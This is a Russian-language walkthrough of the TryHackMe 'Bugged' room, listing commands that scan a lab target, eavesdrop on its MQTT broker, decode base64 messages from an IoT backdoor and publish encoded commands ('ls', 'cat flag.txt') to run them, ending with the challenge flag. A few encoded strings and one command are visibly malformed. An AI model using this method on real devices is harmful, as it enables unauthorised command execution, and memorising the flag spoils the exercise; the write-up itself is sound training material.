[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Bugged](https://tryhackme.com/r/room/bugged)

Всего 1 заданиe:
## Задание 1
Джон работал над своими умными бытовыми приборами, когда заметил странный трафик, проходящий по сети. Можете ли вы 
помочь ему выяснить, что это за странные сетевые коммуникации?

Примечание: полная загрузка машины может занять от 3 до 5 минут.
### Ответьте на вопросы ниже
Что такое флаг?
```commandline
sudo nmap -sV -sC <IP>
sudo apt-get install mosquitto mosquitto-clients -y
mosquitto_sub -t "#" -h <IP>
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==" | base64 -d
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h <IP>
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "simple_massage" -h <IP>
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h <IP>
echo "SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=" | base64 -d
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "e2lkOiAiY2RkMWIxYzDigJMxYzQw4oCTNGIwZi04ZTIy4oCTNjFiMzU3NTQ4YjdkIiwgY21kOiAiQ01EIiwgYXJnOiAibHMifQ==" -h <IP>
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h <IP>
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZy50eHRcbij9" | base64 -d
echo "{"id": "cdd1b1c0–1c40–4b0f-8e22–61b357548b7d", "cmd": "CMD", "arg": "cat flag.txt"}" | base64
mosquitto_pub -t "XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub" -m "e2lkOiBjZGQxYjFjMOKAkzFjNDDigJM0YjBmLThlMjLigJM2MWIzNTc1NDhiN2QsIGNtZDogQ01E
mosquitto_sub -t "U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub" -h <IP>
echo "eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiZmxhZ3suLi4uLi4uLi4ufSJ9" | base64 -d
```
```commandline
flag{18d44fc0707ac8dc8be45bb83db54013}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)